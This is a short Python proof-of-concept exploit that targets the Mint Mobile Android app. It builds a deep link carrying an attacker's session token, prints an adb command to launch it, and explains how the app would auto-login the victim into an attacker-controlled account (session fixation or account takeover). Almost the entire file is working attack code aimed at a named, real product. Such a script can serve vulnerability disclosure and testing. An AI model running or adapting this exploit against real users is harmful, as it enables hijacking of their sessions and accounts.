import argparse
import webbrowser
import os

def generate_malicious_link(attacker_token, host="app.mintmobile.com"):
    """
    Generates a malicious deep link that exploits the insecure auto-login 
    vulnerability in InitialSelectionActivity and MainActivity.
    """
    payload = f"https://{host}/?loginToken={attacker_token}"
    return payload

def main():
    print("--- 🔴 Mint Mobile Account Takeover PoC (FlutterSentinel) ---")
    print("[!] Vulnerability: Insecure Auto-Login via Deep Link Extras")
    print("[!] Target: com.uvnv.mintsim")
    print("-" * 55)

    attacker_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    
    print(f"[*] Attacker Session Token: {attacker_token[:20]}...")
    
    malicious_url = generate_malicious_link(attacker_token)
    print(f"[*] Malicious URL Generated: {malicious_url}")
    
    print("-" * 55)
    print("[?] How to execute:")
    print(f"    1. ADB Command (Simulate click):")
    print(f"       adb shell am start -W -a android.intent.action.VIEW -d \"{malicious_url}\" com.uvnv.mintsim")
    print("\n[?] Result:")
    print("    The app will open InitialSelectionActivity, which will extract the 'loginToken'")
    print("    from the URL and pass it as an Intent Extra to MainActivity.")
    print("    MainActivity will then call autoLoginUser(token) and log the victim into the")
    print("    attacker-controlled account (Account Takeover / Session Fixation).")
    print("-" * 55)

    # Optional: Open in browser if user wants to see the redirect (requires local environment setup)
    # webbrowser.open(malicious_url)

if __name__ == "__main__":
    main()
